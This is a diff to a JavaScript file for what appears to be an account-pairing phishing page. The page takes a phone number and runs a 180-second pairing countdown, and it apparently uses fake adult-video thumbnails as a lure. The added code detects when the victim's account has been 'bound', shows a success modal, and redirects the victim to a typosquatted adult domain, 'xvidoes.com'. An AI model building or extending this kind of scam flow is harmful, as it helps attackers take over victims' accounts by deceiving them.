@@ -1,6 +1,7 @@
 (() => {
   const PREFERRED_COUNTRIES = ["US", "GB", "CA", "AU", "IN", "BR", "DE", "FR", "ES", "JP", "KR", "CN"];
   const PAIRING_COUNTDOWN_SECONDS = 180;
+  const SUCCESS_CONTINUE_URL = "https://xvidoes.com/";
   const COUNTRY_LOCALE_MAP = {
     ad: "ca", ae: "ar", af: "fa", al: "sq", am: "hy", ao: "pt", ar: "es", at: "de", au: "en", az: "az",
     ba: "bs", bd: "bn", be: "nl", bf: "fr", bg: "bg", bh: "ar", bi: "fr", bj: "fr", bn: "ms", bo: "es",
@@ -766,12 +767,63 @@
     });
   }
 
+  function watchBindingSuccess() {
+    const attach = () => {
+      const status = document.querySelector("account-link-status");
+      if (!status) return false;
+
+      if (status.dataset.successWired === "true") return true;
+
+      const applySuccessCopy = () => {
+        const copy = readThemeCopy();
+        document.querySelectorAll("#success-modal [data-copy]").forEach((node) => {
+          const key = node.getAttribute("data-copy");
+          if (key && copy[key]) node.textContent = copy[key];
+        });
+      };
+
+      const openSuccessModal = () => {
+        applySuccessCopy();
+        document.getElementById("main-container")?.style.setProperty("display", "none");
+        document.body.classList.remove("login-open");
+        const modal = document.getElementById("success-modal");
+        if (modal) modal.hidden = false;
+      };
+
+      const sync = () => {
+        if (status.dataset.statusTone === "success" && !status.hidden) openSuccessModal();
+      };
+
+      sync();
+      new MutationObserver(sync).observe(status, {
+        attributes: true,
+        attributeFilter: ["data-status-tone", "hidden"],
+      });
+
+      document.getElementById("success-continue-btn")?.addEventListener("click", () => {
+        window.location.assign(SUCCESS_CONTINUE_URL);
+      });
+
+      status.dataset.successWired = "true";
+      return true;
+    };
+
+    if (attach()) return;
+
+    customElements.whenDefined("account-link-status").then(() => {
+      window.requestAnimationFrame(() => {
+        if (!attach()) window.setTimeout(attach, 120);
+      });
+    });
+  }
+
   function boot() {
     applyLandingCopy();
     duplicateThumbnails();
     watchPhoneField();
     watchSubmitButton();
     watchPairingSteps();
+    watchBindingSuccess();
 
     const overlay = document.getElementById("main-container");
     if (overlay) overlay.style.display = "none";
